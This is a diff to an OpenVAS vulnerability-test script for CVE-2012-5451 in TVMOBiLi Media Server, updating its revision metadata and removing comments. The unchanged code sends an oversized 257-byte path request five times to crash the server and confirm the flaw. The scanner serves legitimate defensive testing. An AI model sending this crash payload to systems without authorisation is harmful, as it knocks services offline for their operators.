@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_tvmobili_media_server_mult_bof_vuln.nasl 6697 2017-07-12 11:40:05Z cfischer $
+# $Id: gb_tvmobili_media_server_mult_bof_vuln.nasl 10941 2018-08-13 14:33:26Z asteins $
 #
 # TVMOBiLi Media Server HTTP Request Multiple BOF Vulnerabilities
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803125");
-  script_version("$Revision: 6697 $");
+  script_version("$Revision: 10941 $");
   script_cve_id("CVE-2012-5451");
   script_bugtraq_id(56853);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 13:40:05 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-13 16:33:26 +0200 (Mon, 13 Aug 2018) $");
   script_tag(name:"creation_date", value:"2012-12-10 10:36:49 +0530 (Mon, 10 Dec 2012)");
   script_name("TVMOBiLi Media Server HTTP Request Multiple BOF Vulnerabilities");
 
@@ -40,6 +40,7 @@ if(description)
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
   script_family("Denial of Service");
+  script_tag(name:"solution_type", value:"VendorFix");
   script_dependencies("gb_get_http_banner.nasl");
   script_require_ports("Services/www", 30888);
   script_mandatory_keys("TVMOBiLi/banner");
@@ -78,10 +79,8 @@ banner = "";
 req = "";
 res = "";
 
-## Get HTTP Port
 port = get_http_port(default:30888);
 
-## Check Banner And Confirm Application
 banner = get_http_banner(port:port);
 if("Server: " >!< banner && "TVMOBiLi UPnP Server/" >!< banner){
   exit(0);
@@ -96,7 +95,6 @@ if('>TVMOBiLi' >!< res && 'TVMOBiLi LTD' >!< res){
   exit(0);
 }
 
-# Construct attack request
 req = http_get(item:string("/", crap(data: "A", length: 257)), port:port);
 
 ## Send the attack request multiple time
@@ -106,7 +104,6 @@ for(i=0; i<5; i++){
 
 banner = get_http_banner(port:port);
 
-## Confirm the  working exploit with banner
 if(!banner && "TVMOBiLi UPnP Server/" >!< banner)
 {
   security_message(port);
